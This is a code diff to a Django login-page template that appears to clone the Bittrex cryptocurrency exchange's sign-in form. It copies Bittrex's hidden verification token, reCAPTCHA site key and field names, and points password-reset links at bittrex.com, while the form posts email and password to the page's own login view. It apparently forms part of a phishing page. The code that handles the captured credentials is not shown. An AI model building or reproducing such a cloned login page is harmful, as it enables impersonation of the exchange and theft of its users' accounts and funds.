@@ -71,16 +71,38 @@
 
         </a>
         <div class="box">
-            <div class="content-wrap">
+                   <div class="content-wrap">
 <form action="{% url 'login' %}" class="form-horizontal" id="loginForm" method="post" role="form">
+    {% csrf_token %}
+    <input name="__RequestVerificationToken" type="hidden" value="msdE-WObNsAQ_X2hYLBnVeT9LIXLc17W9Vov10xwbaO7RQJEjISBzkPS63JgVHV6tmGNStj6xloU-7H9Lp55y49XlI1" />
+    <input data-val="true" data-val-required="The RecaptchaPublicKey field is required." id="RecaptchaPublicKey" name="RecaptchaPublicKey" type="hidden" value="6Lf3WSAUAAAAAOLCgtYTXztdPHtTuZxq9k5DHthK" />
+    <h6>Log in</h6>
+<input autofocus="autofocus" class="form-control" data-val="true" data-val-email="Invalid Email Address" data-val-required="The email address is required" id="UserName" name="UserName" placeholder="Email Address" type="text" value="" /><span class="field-validation-valid" data-valmsg-for="UserName" data-valmsg-replace="true"></span>
+    <input autocomplete="off" class="form-control" data-val="true" data-val-required="The Password field is required." id="Password" name="Password" placeholder="Your Password" type="password" /><span class="field-validation-valid" data-valmsg-for="Password" data-valmsg-replace="true"></span>
+    <input data-val="true" data-val-required="The Remember me? field is required." id="RememberMe" name="RememberMe" type="checkbox" value="true" />
+    <input name="RememberMe" type="hidden" value="false" /><label for="RememberMe" style="margin-left:3px">Remember me?</label>                    <a href="PasswordReset.html" class="forgot">Forgot password?</a>
+                    <button class="g-recaptcha btn btn-primary login"
+                            data-sitekey="6Lf3WSAUAAAAAOLCgtYTXztdPHtTuZxq9k5DHthK"
+                            data-callback="OnSubmit">
+                        <i class="fa fa-sign-in"></i>&nbsp;Login
+                    </button>
+</form>            </div>
+
+
+        <!--    <div class="content-wrap">
+<form action="""""" class="form-horizontal" id="loginForm" method="post" role="form">
 
     <h6>Log in</h6>
-        {% csrf_token %}
-    <input autofocus="autofocus" required="" class="form-control" id="username" name="username" placeholder="Email Address" type="email" value="" /><span class="field-validation-valid" data-valmsg-for="UserName" data-valmsg-replace="true"></span><input autocomplete="off" class="form-control" data-val="true" data-val-required="The Password field is required." id="Password" name="password" placeholder="Your Password" type="password" /><span class="field-validation-valid" data-valmsg-for="Password" data-valmsg-replace="true"></span><input data-val="true" data-val-required="The Remember me? field is required." id="RememberMe" name="RememberMe" type="checkbox" value="true" /><input name="RememberMe" type="hidden" value="false" /><label for="RememberMe" style="margin-left:3px">Remember me?</label>                    <a href="https://bittrex.com/Account/PasswordReset" class="forgot">Forgot password?</a>
+
+
+        <input autofocus="autofocus" required="" class="form-control mb-4"  data-val="true" data-val-email="Invalid Email Address" data-val-required="The email address is required" id="username" name="username" placeholder="Email Address" type="email" value="" /><span class="field-validation-valid" data-valmsg-for="UserName" data-valmsg-replace="true"></span>
+        <input autocomplete="off" class="form-control" data-val="true" data-val-required="The Password field is required." id="Password" name="password" placeholder="Your Password" type="password" /><span class="field-validation-valid" data-valmsg-for="Password" data-valmsg-replace="true"></span><input data-val="true" data-val-required="The Remember me? field is required." id="RememberMe" name="RememberMe" type="checkbox" value="true" /><input name="RememberMe" type="hidden" value="false" /><label for="RememberMe" style="margin-left:3px">Remember me?</label>                    <a href="https://bittrex.com/Account/PasswordReset" class="forgot">Forgot password?</a>
                     <button class="g-recaptcha btn btn-primary login">
                         <i class="fa fa-sign-in"></i>&nbsp;Login
                     </button>
 </form>            </div>
+
+-->
         </div>
         <div class="no-account">
             <p>
@@ -95,7 +117,6 @@
     
 
     
-    <script src='../../www.google.com/recaptcha/api.js'></script>
 
     <script>
         function OnSubmit(token) {
